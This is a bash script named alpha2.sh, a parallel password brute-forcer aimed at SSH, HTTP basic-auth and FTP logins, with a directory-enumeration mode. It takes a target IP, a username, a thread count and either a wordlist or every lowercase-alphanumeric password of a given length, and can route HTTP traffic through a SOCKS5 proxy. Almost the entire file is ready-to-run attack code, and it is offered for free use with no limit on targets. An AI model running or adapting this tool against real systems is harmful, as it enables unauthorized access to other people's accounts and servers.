#!/usr/bin/env bash

# alpha2.sh
# written by Marc Carlson November 8, 2023
# my other repositories: https://github.com/carls0n/
# bash parallel SSH/HTTP/FTP bruteforcer. Tries all possible alphanumeric combinations based on the number of characters.
# also has an option to use a password file instead.
# this is free software. free to use, free to redistribute. Do whatever you like with it.
# if you want to add support for uppercase letters, add {A..Z} to the character set.
# note: 6 alphanumeric characters (no uppercase) generates 2.25 billion possibilities!

unset DISPLAY

charset=({a..z} {0..9})

usage() {
echo "alpha2 parallel SSH/HTTP/FTP bruteforce tool (Marc Carlson 2023)"
echo "usage: ./alpha2.sh [cauptwhT] [options]"
echo "-c  number of characters to use for password permutation"
echo "-a  IP address of remote target"
echo "-p  SOCKS5 proxy address. HTTP only"
echo "-u  username to use"
echo "-t  number of threads to use"
echo "-w  use the wordlist instead. /path/to/list"
echo "-T  Type of attack. ssh, http, ftp or direnum"
}

SECONDS=0

get_args() {
[ $# -eq 0 ] && usage && exit
while getopts ":hp:a:u:t:c:w:T:" arg; do
case $arg in
a) ip="$OPTARG" ;;
p) proxy="--socks5 $OPTARG";;
u) user="$OPTARG" ;;
t) threads="$OPTARG" ;;
c) characters="$OPTARG" ;;
w) wordlist="$OPTARG" ;;
h) usage && exit ;;
T) type="$OPTARG" ;;
esac
done
}

type -P parallel 1>/dev/null
[ "$?" -ne 0 ] && echo "Please install GNU parallel before using this script." && exit
type -P sshpass 1>/dev/null
[ "$?" -ne 0 ] && echo "Please install sshpass before using this script." && exit

function check_flags {
if [[ ! $ip ]]
then
echo please indicate the target IP address && exit
fi
if [[ ! $threads ]]
then
echo please indicate the number of threads with the -t flag && exit
fi
if [[ ! $user ]] && [[ $type != "direnum" ]]
then
echo please indicate the desired user name with the -u flag unless using direnum && exit
fi
if [[ ! $characters ]] && [[ ! $wordlist ]]
then
echo Please indicate either the -w flag and wordlist or the -c flag and number of characters && exit
fi
if [[ -z $type ]]
then
echo Please indicate the type of attack \(ssh, http, ftp or direnum\) with the -T flag && exit
fi
if [[ $type == "direnum" ]] && [[ $characters ]]
then
echo password permutation not available for direnum. Please use -w wordlist instead && exit
fi
}

# credit to pskocik for permutation function based on a post at stackexchange
# https://unix.stackexchange.com/users/23692/pskocik

permute(){
(( $1 == 0 )) && { echo "$2"; return; }
for char in "${charset[@]}"
do
permute "$((${1} - 1 ))" "$2$char"
done
}

get_args $@
check_flags

function update {
while true
do
sleep 300
if [[ $(($SECONDS/3600)) -ge 1 ]]
then
echo [$(date)] Elapsed time: $(($SECONDS/3600)) hour\(s\) and $((($SECONDS/60) % 60)) minutes
else
echo [$(date)] Elapsed time: $(($SECONDS/60)) minutes
fi
done
}

trap 'test' SIGTERM

function direnum {
parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip/{} :::: $wordlist |\
awk '{if($1 =="401") {print $1 " " $2} else if ($1 == "000") {print "Exit with code 000"; exit}}'
}

function ssh {
if [[ $wordlist ]] && [[ -z $characters ]]
then
parallel -k -j $threads sshpass -p {} ssh -oStrictHostKeyChecking=no -q $user@$ip echo Found password: {} :::: $wordlist > .password
elif [[ $characters ]] && [[ -z $wordlist ]]
then
permute $characters | parallel -k -j $threads sshpass -p {} ssh -oStrictHostKeyChecking=no -q $user@$ip echo Found password: {}  > .password
fi
}

function http { 
if [[ $wordlist ]] && [[ -z $characters ]]
then
parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} :::: $wordlist |\
awk '{if($1 == "200") {print "Found Password -> " $2 ;exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
else if ($1 =="403") { print "Exit with code 403"; exit}'} > .password
elif [[ -z $wordlist ]] && [[ $characters ]]
then
permute $characters | parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} |\
awk '{if($1 == "200") {print "Found password -> " $2; exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
else if ($1 =="403") { print "Exit with code 403"; exit}'} > .password
fi
}

function ftp {
if [[ $wordlist ]] && [[ -z $characters ]]
then
parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy ftp://$ip -u $user:{} :::: $wordlist |\
awk '{if($1 == "226") {print "Found password -> " $2; exit}}' > .password
elif [[ -z $wordlist ]] && [[ $characters ]]
then
permute $characters | parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' ftp://$ip -u $user:{} |\
awk '{if($1 == "226") {print "Found password -> " $2; exit}}'  > .password
fi
}

if [[ $type == "direnum" ]]
then
direnum &
pid=$!
elif [[ $type == "ssh" ]]
then
ssh &
pid=$!
elif [[ $type == "http" ]]
then
http &
pid=$!
elif [[ $type == "ftp" ]]
then
ftp &
pid=$!
fi

update &
updatepid=$!

if [[ -e .password ]]; then rm .password
fi
if [[ ! -e .password ]]; then touch .password
fi

while kill -0 $pid 2>/dev/null
do
sleep 1
if [[ ! -z $(cat .password) ]]
then
kill -s SIGTERM 0
pkill sleep
elif ! kill -0 $pid 2>/dev/null
then
kill -s SIGTERM 0
pkill sleep
fi
done

if [[ ! -z .password ]]
then
while read line
do
echo "$line"
done< .password
fi
rm .password
